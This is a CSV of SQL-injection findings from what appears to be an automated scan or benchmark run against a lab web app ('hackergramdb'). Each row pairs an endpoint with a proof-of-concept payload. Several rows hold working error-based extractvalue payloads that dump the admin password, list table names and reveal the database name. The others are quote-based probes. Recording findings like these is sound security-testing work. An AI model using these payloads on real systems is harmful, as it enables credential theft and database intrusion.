run_id,endpoint,vulnerability,poc
20260902-2242-0003,`/profile?username=`,SQL Injection,"`admin'+AND+extractvalue(1,concat(0x7e,(SELECT+password+FROM+hackergramdb.Users+WHERE+username='admin')))--+%20`"
20260902-2242-0003,`/friends?username=`,SQL Injection,"`'+AND+extractvalue(1,concat(0x7e,(SELECT+group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema='hackergramdb')))--+%20`"
20260902-2242-0003,`/users?search=`,SQL Injection,`' trash`
20260902-2242-0003,`/direct_messages?username=`,SQL Injection,`'`
20260902-2242-0003,`/edit_post?id=`,SQL Injection,`1' trash`
20260902-2242-0003,`/delete_post?id=`,SQL Injection,`1' trash`
20260902-2242-0003,`/create_post` (POST `content`),SQL Injection,"`'+AND+extractvalue(1,concat(0x7e,(SELECT+database())))--+%20`"
20260902-2242-0003,`/edit_post` (POST `id`),SQL Injection,`1' trash`
20260902-2242-0003,`/remove_request` (POST `username`),SQL Injection,`' trash`
20260902-2242-0003,`/request_friend` (POST `username`),SQL Injection,`admin' trash`
